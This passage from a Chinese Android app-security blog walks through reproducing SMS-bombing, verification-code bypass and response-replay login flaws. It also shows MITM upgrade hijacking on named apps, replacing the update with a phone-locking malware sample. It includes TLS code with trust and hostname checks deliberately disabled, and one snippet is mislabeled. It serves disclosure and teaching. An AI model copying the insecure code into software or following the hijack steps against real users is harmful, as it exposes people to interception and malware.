alt="image-20220411104901496"></p><p>同理，我们可以发现验证码校验的一些段落，包括四位验证码等</p><p>最后经过分析，得出就是服务端会对每次发送的手机号和系统时间和手机号编码产生的密钥进行校验，会对60s时间进行校验，以及会对当前手机系统时间进行校验</p><p>这里我们可以简单进行60s间隔的短信轰炸，可以简单实现效果如下：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0017/34.png" alt="image-20220411105257847"></p><p>因为现在短信轰炸漏洞越来越少，这里没找到更加合适的案例，这里收集一个大佬写的短信漏洞轰炸的文章，可以参考下：<a href="https://www.anquanke.com/post/id/93878">挖洞技巧：绕过短信&amp;邮箱轰炸限制以及后续</a></p><h4 id="（3）安全防护-1"><a href="#（3）安全防护-1" class="headerlink" title="（3）安全防护"></a>（3）安全防护</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(1)增加验证码发送校验时间间隔</span><br><span class="line">(2)采用代理池对ip进行限制</span><br></pre></td></tr></table></figure><h3 id="3-验证码泄露风险与万能验证码漏洞"><a href="#3-验证码泄露风险与万能验证码漏洞" class="headerlink" title="3.验证码泄露风险与万能验证码漏洞"></a>3.验证码泄露风险与万能验证码漏洞</h3><h4 id="（1）原理分析-2"><a href="#（1）原理分析-2" class="headerlink" title="（1）原理分析"></a>（1）原理分析</h4><p>验证码执行【找回密码】操作时，输入手机号，获取验证码，服务器会向手机发送验证码，通过burpsuite抓包工具，查看返回的响应数据包中如果包含验证码，则可能导致用户密码恶意重置、绑定手机号被恶意更换等风险</p><p>万能验证码一般是开发在业务未上线的时候为了方便测试用的,上线后忘记删除了,例如[8888 0000 1234](tel:8888 0000 1234)等等</p><h4 id="（2）安全防护"><a href="#（2）安全防护" class="headerlink" title="（2）安全防护"></a>（2）安全防护</h4><p>因为当下这种漏洞较少，这里没有找到合适案例，就只简单介绍下原理了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">（1）禁止验证码在本地客户端生成，应采用服务器端验证码生成机制；</span><br><span class="line">（2）设置验证码的时效性，如180秒过期；</span><br><span class="line">（3）验证码应随机生成，且使用一次即失效。</span><br></pre></td></tr></table></figure><h3 id="4-修改返回包绕过登录漏洞"><a href="#4-修改返回包绕过登录漏洞" class="headerlink" title="4.修改返回包绕过登录漏洞"></a>4.修改返回包绕过登录漏洞</h3><h4 id="（1）原理分析-3"><a href="#（1）原理分析-3" class="headerlink" title="（1）原理分析"></a>（1）原理分析</h4><p>在APP验证码测试过程中，我们发现很对APP并未对登录成功的响应报文进行校验，导致我们获取登录成功的响应报文后，就可以通过正确的响应报文实现任意号码的登录，导致信息泄露</p><h4 id="（2）漏洞复现-2"><a href="#（2）漏洞复现-2" class="headerlink" title="（2）漏洞复现"></a>（2）漏洞复现</h4><p>案例：XXAPP</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0017/35.png" alt="image-20220411110615223"></p><p>我们先使用手机号进行正确的登录，同时我们使用burpsuit抓取正确登录的响应信息</p><p><strong>发送的请求：</strong></p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0017/36.png" alt="image-20220411110709567"></p><p><strong>响应的报文：</strong></p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0017/37.png" alt="image-20220411110756668"></p><p>此时我们可以获取正确响应的报文，我们只需要对在下次登录时对该响应请求进行替换即可</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0017/38.png" alt="image-20220411110840086"></p><p>此时我们再次登录，这里我们随便输入验证码5555</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0017/39.png" alt="image-20220411110840086"></p><p>然后我们注意设置对响应进行抓取</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0017/40.png" alt="image-20220411111006306"></p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0017/41.png" alt="image-20220411111006306"></p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0017/42.png" alt="image-20220411111055714"></p><p>然后进行替换</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0017/43.png" alt="image-20220411111136053"></p><p>最后我们替换报文发现成功登录：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0017/44.png" alt="image-20220411111203716"></p><h4 id="（3）安全防护-2"><a href="#（3）安全防护-2" class="headerlink" title="（3）安全防护"></a>（3）安全防护</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">不要在前端利用服务端返回的值判断是否可以修改密码 要把整个效验环节交给服务端</span><br></pre></td></tr></table></figure><h2 id="五、实验总结"><a href="#五、实验总结" class="headerlink" title="五、实验总结"></a>五、实验总结</h2><p>本文详细的介绍了APP中的抓包技术，以及讲述了当下APP端验证码漏洞挖掘实现的一些常见的方式，验证码漏洞还有更多的漏洞，后续会进一步完善，本文拿了一些实例具体复现了漏洞的挖掘步骤，并提交CNVD获得了一些中高危漏洞，一些更详细资料放在github和星球中</p><p>github首页：<a href="https://github.com/guoxuaa">github</a></p><h2 id="六、参考文献"><a href="#六、参考文献" class="headerlink" title="六、参考文献"></a>六、参考文献</h2><p>参考书籍：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">安卓Frida逆向与抓包实战</span><br></pre></td></tr></table></figure><p>验证码漏洞：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://www.52pojie.cn/thread-1613856-1-1.html</span><br><span class="line">https://www.jianshu.com/p/d2b4c6a54d68</span><br><span class="line">https://www.bilibili.com/read/cv4218190</span><br></pre></td></tr></table></figure><p>短信轰炸漏洞：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://www.anquanke.com/post/id/93878</span><br><span class="line">https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=27614</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;一、前言&quot;&gt;&lt;a href=&quot;#一、前言&quot; class=&quot;headerlink&quot; title=&quot;一、前言&quot;&gt;&lt;/a&gt;一、前言&lt;/h2&gt;&lt;p&gt;验证码漏洞也是当下十分常见的APP端漏洞，本文对验证码漏洞原理做了一个初步的讲解，并复现了当下一些常见的验证码相关的漏洞，本文App抓包技术参考了肉丝大佬的书籍安卓Frida逆向和抓包实战&lt;/p&gt;</summary>
    
    
    
    <category term="Android APP漏洞之战" scheme="http://security-kitchen.com/categories/Android-APP%E6%BC%8F%E6%B4%9E%E4%B9%8B%E6%88%98/"/>
    
    
    <category term="漏洞挖掘" scheme="http://security-kitchen.com/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    
    <category term="工具" scheme="http://security-kitchen.com/tags/%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>Android App漏洞之战（16）——通信漏洞的案例实操</title>
    <link href="http://security-kitchen.com/2023/02/14/bug0016/"/>
    <id>http://security-kitchen.com/2023/02/14/bug0016/</id>
    <published>2023-02-14T01:02:19.000Z</published>
    <updated>2023-12-23T09:13:44.113Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一、漏洞介绍"><a href="#一、漏洞介绍" class="headerlink" title="一、漏洞介绍"></a>一、漏洞介绍</h2><span id="more"></span><h2 id=""><a href="#" class="headerlink" title=""></a></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">APP升级劫持漏洞是最常见的通用型逻辑缺陷漏洞，攻击者一般通过劫持APP升级的响应，通过伪造和篡改的方式来实现中间人攻击，从而向应用中注入恶意程序</span><br><span class="line">CNVD-2021-40179和CNVD-2021-45684便是采用中间人劫持攻击，来实现APP的恶意劫持替换</span><br><span class="line">现在市面上常用的APP,基本采用http明文传输——&gt;https加密传输——&gt;http/https+hash校验三种方式，我们依次对酷我音乐、酷狗音乐、学而思网校等主流APP做漏洞测试，来描述中间人攻击的具体实现</span><br></pre></td></tr></table></figure><h2 id="二、原理解析"><a href="#二、原理解析" class="headerlink" title="二、原理解析"></a>二、原理解析</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">中间人攻击（MITM）是指攻击者与通讯的两端分别独立的联系，并交换其所收到的数据，使得通讯的两端认为他们正在通过一个私密的连接与对方直接对话，但事实上整个会话都会被攻击者完全控制</span><br><span class="line">在中间人攻击中，攻击者可以拦截通讯双方的通话并插入新的内容</span><br></pre></td></tr></table></figure><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0016/0.png" alt="avatar"></p><p>客户端不验证服务器是否可信，即checkServerTrusted()方法为空</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">@Override</span><br><span class="line">public void checkClientTrusted(X509Certificate[] chain, String authType)&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不检查站点域名与站点证书的域名是否匹配</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">HostnameVerifier hv = new HostnameVerifier()&#123;</span><br><span class="line">@Override</span><br><span class="line">public boolean verify(String hostname,SSLSession session)&#123;</span><br><span class="line">return true;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接收任意域名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SSLSocketFactory sf;</span><br><span class="line">......</span><br><span class="line">sf.setHostnameVerifier(SSLSocketFactory.ALLOW_ALL_HOSTNAME_VERIFIER)</span><br></pre></td></tr></table></figure><h2 id="二、实验准备"><a href="#二、实验准备" class="headerlink" title="二、实验准备"></a>二、实验准备</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Fiddler</span><br><span class="line">夜神模拟器（有条件的最好用真机）</span><br><span class="line">HFS文件服务器</span><br><span class="line">Stunnel</span><br><span class="line">恶意锁机样本——Wifikillpro.apk</span><br></pre></td></tr></table></figure><h2 id="三、实验步骤"><a href="#三、实验步骤" class="headerlink" title="三、实验步骤"></a>三、实验步骤</h2><h3 id="1-http明文传输升级劫持——以酷我音乐为例（CNVD-2021-45684）"><a href="#1-http明文传输升级劫持——以酷我音乐为例（CNVD-2021-45684）" class="headerlink" title="1. http明文传输升级劫持——以酷我音乐为例（CNVD-2021-45684）"></a>1. http明文传输升级劫持——以酷我音乐为例（CNVD-2021-45684）</h3><p><strong>（1）Fiddler环境配置</strong></p><p>​参考链接：<a href="https://bbs.pediy.com/thread-268445.htm">Fiddler环境配置</a></p><p><strong>（2）安装酷我音乐，并抓取响应请求</strong></p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0016/1.png" alt="avatar"></p><p>然后，我们可以发现程序下载完成后，显示正常的升级界面</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0016/2.png" alt="avatar"></p><p>我们进一步分析报文的详细信息：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0016/3.png" alt="avatar"></p><p>我们可以知道这条请求就是程序的下载请求，对应的就是下载的apk，我们尝试劫持这条请求，将apk替换成我们的恶意锁机程序</p><p><strong>（3）劫持攻击</strong></p><p>​1）下劫持响应请求断点，可以让我们在劫持特定的请求响应</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">这里我总结集中常见的指令：</span><br><span class="line">bpu+URL:    中断特定URL的全部session请求报文</span><br><span class="line">bpafter+URL:中断特定URL的全部session响应报文</span><br><span class="line">bps+URL:    中断 HTTP 响应状态的指定URL的全部session响应</span><br><span class="line">bpv+URL:    中断指定请求方式的全部 session 响应</span><br><span class="line">bpm+URL:    中断指定请求方式的全部 session 响应。等同于bpv</span><br><span class="line">bpu/bpafter/bps/bpv/bpm  停止断点</span><br></pre></td></tr></table></figure><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0016/4.png" alt="avatar"></p><p>​2）通过HFS文件管理服务器，来模拟请求的服务器</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0016/5.png" alt="avatar"></p><p>注意路径应与apk下载请求url保持一致，域名设置为我们本机的ip地址</p><p>​3）重新安装，开始升级</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0016/6.png" alt="avatar"></p><p>此时，我们将下载请求给劫持下来了，我们只需要更改域名为我们ip地址，再响应就可以下载我们的锁机程序了</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0016/7.png" alt="avatar"></p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0016/8.png" alt="avatar"></p><p>此时我们发现我们的锁机样本被用户成功的下载，用户在未知情况下打开，便被锁机了</p><h3 id="2-http-hash验证升级劫持——以酷狗音乐为例（CVND-2021-46587）"><a href="#2-http-hash验证升级劫持——以酷狗音乐为例（CVND-2021-46587）" class="headerlink" title="2. http+hash验证升级劫持——以酷狗音乐为例（CVND-2021-46587）"></a>2. http+hash验证升级劫持——以酷狗音乐为例（CVND-2021-46587）</h3><p><strong>(1) 安装酷狗音乐，抓取响应请求</strong></p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0016/10.png" alt="avatar"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">我们可以发现响应的结果中包含hash值，下载的链接，我们只需要将此响应的hash值替换成我们恶意应用的hash值，然后将下载的url劫持为我们本地的即可</span><br></pre></td></tr></table></figure><p><strong>（2）劫持升级</strong></p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0016/11.png" alt="avatar"></p><p>我们用文件服务器模拟该url：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0016/12.png" alt="avatar"></p><p>我们将主机的域名解析更改为我们本地的ip：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0016/13.png" alt="avatar"></p><p>我们查取我们恶意程序的hash值：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0016/14.png" alt="avatar"></p><p>我们劫持更新响应的url：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0016/15.png" alt="avatar"></p><p>开始升级替换：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0016/16.png" alt="avatar"></p><p>我们成功替换hash值，并点击升级：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0016/17.png" alt="avatar"></p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0016/18.png" alt="avatar"></p><h3 id="3-https-hash验证升级劫持——以学而思网课为例（CVND-2021-169938）"><a href="#3-https-hash验证升级劫持——以学而思网课为例（CVND-2021-169938）" class="headerlink" title="3. https+hash验证升级劫持——以学而思网课为例（CVND-2021-169938）"></a>3. https+hash验证升级劫持——以学而思网课为例（CVND-2021-169938）</h3><p><strong>（1）配置stunnel，实现https下载</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">由于我们的HFS文件服务器只能支持http访问，但是对于当下市面上大多是https传输，所以我们可以结合stunnel+HFS实现https访问下载</span><br></pre></td></tr></table></figure><p>stunnel配置：详细见<a href="https://bbs.pediy.com/thread-268459.htm">stunnel配置</a></p><p><strong>（2）我们劫持请求报文</strong></p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0016/19.png" alt="avatar"></p><p>我们将响应的报文保存下来，并修改其对应的MD5值</p><p><strong>（3） 我们用HFS模拟下载的URL链接</strong></p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0016/20.png" alt="avatar"></p><p><strong>（4） 由于是采用https传输，我们需要借助工具stunnel，才能实现https传输</strong></p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0016/21.png" alt="avatar"></p><p>我们配置好后，就可以https访问了</p><p><strong>（5）我们进行截获</strong></p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0016/22.png" alt="avatar"></p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0016/23.png" alt="avatar"></p><p>​重新启动，我们发现可以升级截获成功</p><h2 id="四、实验总结"><a href="#四、实验总结" class="headerlink" title="四、实验总结"></a>四、实验总结</h2><p>我们总结了当下APP升级劫持攻击的常见形式，并分别对三种不同形式的升级劫持攻击做了一个具体的案例描述，可以发现都是通过抓包劫持替换实现的，恶意攻击者可以在用户手机中安装证书，就可以使用http&#x2F;https中间人攻击，来劫持升级报文。我们可以发现当下大部分主流的APP都存在这种漏洞，并以此对提交的三个漏洞做了一个讲解，对于一些其他的APP，通常采用加密算法加密，这样获取报文的情况较难。</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;一、漏洞介绍&quot;&gt;&lt;a href=&quot;#一、漏洞介绍&quot; class=&quot;headerlink&quot; title=&quot;一、漏洞介绍&quot;&gt;&lt;/a&gt;一、漏洞介绍&lt;/h2&gt;</summary>
    
    
    
    <category term="Android APP漏洞之战" scheme="http://security-kitchen.com/categories/Android-APP%E6%BC%8F%E6%B4%9E%E4%B9%8B%E6%88%98/"/>
    
    
    <category term="漏洞挖掘" scheme="http://security-kitchen.com/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    
    <category term="工具" scheme="http://security-kitchen.com/tags/%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>Android App漏洞之战（15）——Https（http）通信漏洞详解</title>
    <link href="http://security-kitchen.com/2023/02/14/bug0015/"/>
    <id>http://security-kitchen.com/2023/02/14/bug0015/</id>
    <published>2023-02-14T01:01:19.000Z</published>
    <updated>2023-12-23T09:13:44.113Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h2><p>本文主要介绍Android http&#x2F;https方面的安全漏洞问题，并会从原理并结合案例来逐一讲解，本文一部分参考网络上一些博客，并在相应部分给出链接</p><p>本文第二节主要讲述Android http&#x2F;https相关的基础知识</p><p>本文第三节为漏洞原理解析和漏洞复现</p><p>本文第四节为Android https转包漏洞介绍</p><span id="more"></span><h2 id="二、基础知识"><a href="#二、基础知识" class="headerlink" title="二、基础知识"></a>二、基础知识</h2><h3 id="1-加密算法"><a href="#1-加密算法" class="headerlink" title="1.加密算法"></a>1.加密算法</h3><h4 id="（1）对称加密"><a href="#（1）对称加密" class="headerlink" title="（1）对称加密"></a>（1）对称加密</h4><p>对称加密算法是双方都持有相同的密钥进行通信，加密速度很快</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0015/1.png" alt="image-20211204145051628"></p><p>特点：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a.加密和解密都是用同一个秘钥</span><br><span class="line">b.加密、解密效率高</span><br><span class="line">c.秘钥被窃取，容易造成数据不安全</span><br><span class="line">常见的对称加密算法有DES、3DES、AES等，这里我们就不深入讲解了</span><br></pre></td></tr></table></figure><p>缺点：</p><p>上面的对称加密模型最大的问题就是，对称加密模型需要一个安全的信道来传输对称密钥，但是如果真的存在一个真正安全的信道，那直接用这个信道来传输数据就可以了，这就有点矛盾了</p><h4 id="（2）非对称加密"><a href="#（2）非对称加密" class="headerlink" title="（2）非对称加密"></a>（2）非对称加密</h4><p>非对称加密，是为了解决对称加密中的安全问题而诞生，含有一对密钥：公钥和私钥，发送方用公钥进行加密，公钥可以被公开，接收方用私钥进行解密，私钥不可公开</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0015/2.png" alt="image-20211204150154475"></p><p>特点：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a.用公钥加密用私钥解密</span><br><span class="line">b.加密、解密相对于对称加密效率更低，但是比对称加密更安全</span><br><span class="line">c.公钥可能被中间人伪造，造成数据不安全</span><br><span class="line">常见的非对称加密算法有RSA、DSA等</span><br></pre></td></tr></table></figure><p>缺点：</p><p>如何保证加密的是接收方的公钥，如何安全的传输公钥</p><h3 id="2-信息安全问题"><a href="#2-信息安全问题" class="headerlink" title="2.信息安全问题"></a>2.信息安全问题</h3><p>我们在传输数据的过程中往往着眼于三个方面的安全问题：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">（<span class="number">1</span>）信息的保密性</span><br><span class="line">（<span class="number">2</span>）信息的完整性</span><br><span class="line">（<span class="number">3</span>）身份识别</span><br></pre></td></tr></table></figure><h4 id="（1）信息的保密性"><a href="#（1）信息的保密性" class="headerlink" title="（1）信息的保密性"></a>（1）信息的保密性</h4><p>我们一般会使用各种加密算法对我们传输的数据信息进行加密，即使用上面的对称加密和非对称加密来完成，但无论是对称加密还是非对称加密都存在一个共同的安全问题：<code>密钥如何传递，而且提高传输速率</code>，一般公用的方法是采用<code>对称加密+非对称加密结合</code>，即双方都在使用对称加密进行传输，但是会存在密钥不能保证安全性的问题，此时我们使用公钥对对称密钥进行加密，然后接收方使用私钥对对称密钥进行解密，这样就可以解决这个问题</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0015/3.png" alt="image-20211204151540175"></p><h4 id="（2）信息的完整性（数字签名）"><a href="#（2）信息的完整性（数字签名）" class="headerlink" title="（2）信息的完整性（数字签名）"></a>（2）信息的完整性（数字签名）</h4><p>数据在传输的过程中，我们的信息可能被第三方劫持篡改，所以我们要保证信息的完整性，一般通过使用散列函数如SHA1，MD5将传输内容hash依次获得hash值，即摘要。客户端使用服务端的公钥对摘要和信息内容进行加密，传输给服务端，服务端使用私钥进行解密，然后用相同的hash算法对原始内容进行hash，然后与摘要值对比，如果一直，说明信息是完整的</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0015/4.png" alt="image-20211204152606806"></p><p>举例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Android APP应用一般就具有签名验证机制，以防止恶意攻击者在对APP进行逆向之后，重打包，一般来说Android APP的签名机制分为3类：</span><br><span class="line">（1）java本地验证，在java代码中有hash函数验证，我们通常搜索signature定位到目标代码段，直接删除或hook该代码段即可</span><br><span class="line">（2）so本地验证，为了加强逆向难度，很多公司会将APP验证写在so层，这一般我们通过IDA动态调试，获取代码段然后NOP即可</span><br><span class="line">（3）网络服务器验证，一般来说这种进行网络hash验证，一般这种通过抓包，但有一些加密后变很难处理了</span><br></pre></td></tr></table></figure><h4 id="（3）身份识别（数字证书）"><a href="#（3）身份识别（数字证书）" class="headerlink" title="（3）身份识别（数字证书）"></a>（3）身份识别（数字证书）</h4><p>我们在信息传输过程中，通常要验证信息的发送方的身份，我们将发送端的公钥发送给接收端，发送端通过把自己的内容使用私钥加密然后发送给接收端，接收端只能使用发送端的公钥加密，自然就验证了发送端的身份</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0015/5.png" alt="image-20211204154251711"></p><p>数字证书：</p><p>但是上述过程中存在一个问题，在传输的过程中，客户端如何获得服务器的公钥呢？当服务器分发给客户端，如果一开始服务端发送的公钥到客户端就被第三方劫持，然后第三方自己伪造一对密钥，将公钥发送给客户端，当服务端发生数据给客户端的时候，中间人就将信息劫持，用一开始劫持的公钥进行解密，然后将自己的私钥将数据发送给客户端，而客户端收到后使用公钥解密，这个过程中中间人是透明的，就可以获取信息了</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0015/6.png" alt="image-20211204162208265"></p><p>为了防止这种中间人攻击，数字证书就出现了，其实是基于上面所说的私钥加密数据，公钥解密来验证其身份</p><p>数字证书是由权威的CA（Certificate Authority）机构给服务端进行颁发，CA机构通过服务端提供的相关信息生成证书，证书内容包含了持有人的相关信息，服务器的公钥，签署者签名信息（数字签名）等，最重要的是公钥在数字证书中</p><p>数字证书由权威的CA（Certificate Authority）机构给服务端进行颁发，CA机构通过服务端提供的相关信息生成证书，证书内容包含了持有人的相关信息，服务器的公钥，签署者签名信息（数字签名）等，最重要的是<code>公钥在数字证书</code>中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(1)数字证书是如何保证公钥来自于请求的服务器呢？</span><br><span class="line">数字证书上由持有人的相关信息，通过这点可以确定其不是一个中间人</span><br><span class="line">(2)如何保证数字证书为真呢？</span><br><span class="line">一个证书中含有三个部分:&quot;证书内容，散列算法，加密密文&quot;，证书内容会被散列算法hash计算出hash值，然后使用CA机构提供的私钥进行RSA加密</span><br></pre></td></tr></table></figure><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0015/7.png" alt="image-20211204162925136"></p><p>客户端完成验证过程：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">当客户端发起请求是，服务端将该数字证书发送到客户端，客户端通过CA机构提供的公钥对加密密文来进行解密获得散列值（数字签名），同时将证书内容使用相同的散列算法进行Hash得到另一个散列值，比对两个散列值，如果两者相等则说明证书没问题</span><br></pre></td></tr></table></figure><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0015/8.png" alt="image-20211204163230226"></p><p>一些常见的证书分类：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">X.509#DER 二进制格式证书，常用后缀.cer .crt</span><br><span class="line">X.509#PEM 文本格式证书，常用后缀.pem</span><br><span class="line">有的证书内容是只包含公钥（服务器的公钥），如.crt、.cer、.pem</span><br><span class="line">有的证书既包含公钥又包含私钥（服务器的私钥），如.pfx、.p12</span><br></pre></td></tr></table></figure><p>为了保证证书的一致性，国际电信联盟设计了一套专门针对证书格式的标准X.509，其核心提供了一种描述证书的格式</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0015/9.png" alt="image-20211204163230226"></p><h3 id="3-Http-x2F-Https详解"><a href="#3-Http-x2F-Https详解" class="headerlink" title="3.Http&#x2F;Https详解"></a>3.Http&#x2F;Https详解</h3><h4 id="（1）TLS-x2F-SSL"><a href="#（1）TLS-x2F-SSL" class="headerlink" title="（1）TLS&#x2F;SSL"></a>（1）TLS&#x2F;SSL</h4><p>http:超文本传输协议，采用明文的方式去传输数据，经过我们上文的分析，在这个过程中很容易导致中间人攻击，因此为了进一步增强数据传输的安全性，开始出现https，而在此之前我们就需要了解一下TLS&#x2F;SSL</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SSL：（Secure Socket Layer，安全套接字层），位于可靠的面向连接的网络层协议和应用层协议之间的一种协议层。SSL通过互相认证、使用数字签名确保完整性、使用加密确保私密性，以实现客户端和服务器之间的安全通讯</span><br><span class="line">TLS：(Transport Layer Security，传输层安全协议)，用于两个应用程序之间提供保密性和数据完整性</span><br></pre></td></tr></table></figure><p>我们先看一下SSL和TLS的区别：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">简而言之，TLS只是SSL后来迭代的版本而已，在1994年，NetScape设计了SSL协议，1999年，互联网标准化组织ISOC接替NetScape公司，发布了SSL的升级版TLS 1.0版，因此可以理解为TLS 1.0 = SSL 3.1，只是SSL后来的的版本而已</span><br></pre></td></tr></table></figure><p>SSL协议即用到了对称加密也用到了非对称加密(公钥加密)，在建立传输链路时，SSL首先对对称加密的密钥使用公钥进行非对称加密，链路建立好之后，SSL对传输内容使用对称加密</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.对称加密</span><br><span class="line">速度高，可加密内容较大，用来加密会话过程中的消息</span><br><span class="line"></span><br><span class="line">2.公钥加密</span><br><span 